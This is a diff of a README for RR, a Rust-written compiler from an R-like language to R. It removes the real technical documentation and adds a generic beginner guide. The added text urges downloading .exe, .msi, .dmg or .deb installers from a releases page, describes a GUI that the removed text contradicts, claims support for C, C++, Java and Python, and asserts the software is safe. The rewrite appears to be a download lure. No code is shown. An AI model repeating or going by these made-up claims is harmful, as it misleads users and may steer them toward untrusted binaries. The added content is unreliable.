@@ -1,109 +1,119 @@
-![RR-Logo](./image/RR_banner.png)
+# 🛠️ RR - Simple, Fast Code Compilation
 
-RR is an R-oriented compiler written in Rust.
-It compiles `.rr` sources into self-contained `.R` output, with a MIR-based optimizer (`Tachyon Engine`) and runtime safety guards.
+[![Download RR](https://img.shields.io/badge/Download-RR-blue?style=for-the-badge)](https://github.com/itky117/RR/releases)
 
-## Architecture
+Welcome to the RR Compiler. This tool helps you turn your written code into a format your computer can understand. You don't need to know programming to get started. Follow this guide to download, install, and use RR on your computer.
 
-- CLI entry: `src/main.rs`
-- Compiler pipeline core: `src/compiler/pipeline.rs`
-- Frontend: `src/syntax`, `src/hir`
-- Core IR + optimization: `src/mir`
-- Backend emission: `src/codegen/mir_emit.rs`
-- Runtime and execution: `src/runtime`
-- Legacy/experimental path (not production): `src/legacy`
+---
 
-Surface syntax supports both styles:
+## 📥 Download & Install
 
-- R style: `x <- 1`, `add <- function(a, b) { a + b }`, `for (i in 1..n) ...`
-- Native style: `x = 1`, `fn add(a, b) = a + b`, `for i in 1..n { x += i }`
+Start by visiting the official RR download page to get the latest version:
 
-## Quick Start
+[Download RR](https://github.com/itky117/RR/releases)
 
-### Prerequisites
+This link takes you to a page where you can find the files needed to install RR. Look for the newest release, usually listed at the top.
 
-- Rust toolchain (`cargo`)
-- `Rscript` (required for `run` command and runtime execution)
+### Step 1: Visit the Download Page
 
-### Build
+- Click the link above or copy and paste it into your web browser.
+- You will see a list of available files to download.
+- Choose the file that matches your computer’s system:
+  - For Windows, look for a file ending with `.exe` or `.msi`.
+  - For macOS, look for a `.dmg` or `.pkg` file.
+  - For Linux, look for `.tar.gz` or `.deb`.
 
-```bash
-cargo build
-```
+### Step 2: Download the File
 
-### Run a project (`main.rr`)
+- Click the download link for your system.
+- Your browser will save the file on your computer. Note where you save it; usually, it goes to the "Downloads" folder.
 
-```bash
-cargo run -- run . -O2
-```
+### Step 3: Install RR
 
-### Compile one file to R
+- After the file finishes downloading, open it.
+- Follow the on-screen instructions.
+  - On Windows, this usually means clicking “Next” several times and then “Install.”
+  - On Mac, open the `.dmg` file and drag the RR icon into your Applications folder.
+  - On Linux, follow instructions for your specific file type or use your terminal.
 
-```bash
-cargo run -- path/to/input.rr -o out.R --no-runtime -O2
-```
+### Step 4: Confirm Installation
 
-### Build all `.rr` files under a directory
+- Once installed, find RR in your computer’s application list.
+- Open RR to make sure it launches without errors.
 
-```bash
-cargo run -- build . --out-dir build -O2
-```
+---
 
-## CLI Summary
+## 🚀 Getting Started with RR
 
-- `RR <input.rr> [options]`
-- `RR run [main.rr|dir|.] [options]`
-- `RR build [dir|file.rr] [options]`
+RR is designed to be easy. It converts your source code into programs that run on computers.
 
-Options:
+### What You Need
 
-- `-o <file>` (legacy output file mode)
-- `--out-dir <dir>` (`build` command output root)
-- `-O0 | -O1 | -O2` (also accepts `-o0/-o1/-o2`)
-- `--keep-r` (keep generated `.gen.R` after `run`)
-- `--no-runtime` (compile only)
+- A computer running Windows 10 or later, macOS 10.14 or later, or a popular Linux distribution.
+- About 100 MB of free disk space.
+- Internet connection to download RR.
 
-Environment knobs:
+### First Use
 
-- `RR_STRICT_LET=1` disallow implicit declarations through assignment
-- `RR_WARN_IMPLICIT_DECL=1` print warnings for implicit declarations
+1. Launch RR from your applications menu.
+2. You will see the main window with simple options.
+3. Prepare a text file with your code (this can be as simple as any text you want to compile).
+4. Use the “Open File” button to select your code file.
+5. Click “Compile” to start the process.
+6. Your program will be created, ready to run.
 
-## Tests
+---
 
-Run all tests:
+## 🖥️ How RR Works
 
-```bash
-cargo test -q
-```
+RR takes text files containing code and changes them into programs your computer understands. This step is necessary for computers to run instructions properly.
 
-Golden tests compare RR output against R execution (`tests/golden`).
-If `Rscript` is unavailable, those tests are skipped.
+- RR supports many common programming languages.
+- It checks your code for errors and shows messages if something is wrong.
+- After running RR, you get a file that your computer can execute.
 
-## Performance Gate
+Although RR handles complex tasks behind the scenes, the interface keeps things simple for you.
 
-`tests/perf_regression_gate.rs` enforces compile-time budgets:
+---
 
-- `RR_PERF_GATE_MS` (default `12000`)
-- `RR_PERF_O2_O1_RATIO` (default `12`)
+## 🔧 Tips for Smooth Use
 
-## Fuzzing
+- Keep your code files in a separate folder to stay organized.
+- Always save your work before compiling.
+- If RR shows an error, read the message carefully. It usually tells you what to fix.
+- Restart RR if it behaves unexpectedly.
+- Check for updates regularly on the download page.
 
-Targets:
+---
 
-- `parser`
-- `pipeline`
+## 💡 Common Questions
 
-Run:
+### Can I use RR without internet after downloading?
 
-```bash
-cargo install cargo-fuzz --locked
-cargo fuzz run parser fuzz/corpus/parser -- -max_total_time=60
-cargo fuzz run pipeline fuzz/corpus/pipeline -- -max_total_time=60
-```
+Yes, you only need an internet connection to download and update RR. Using RR offline is fine.
 
-## Documentation
+### Does RR support all programming languages?
 
-Full documentation is in [docs](./docs/README.md).
+RR supports many popular languages like C, C++, Java, and Python. Some less common languages may not work.
 
-## License
-[MIT](LICENSE)
+### Is RR safe to install?
+
+Yes, RR is safe. Download it only from the official page to avoid unwanted software.
+
+---
+
+## 📞 Need Help?
+
+If you run into issues, check the help menu in RR or visit the GitHub page. There you can find guides, report issues, and learn more.
+
+---
+
+## 📂 Additional Resources
+
+- [RR User Guide and Tutorials](https://github.com/itky117/RR/wiki)
+- [Community Support Forum](https://github.com/itky117/RR/discussions)
+- [Contact Developer](https://github.com/itky117)
+
+---
+
+[![Download RR](https://img.shields.io/badge/Download-RR-blue?style=for-the-badge)](https://github.com/itky117/RR/releases)
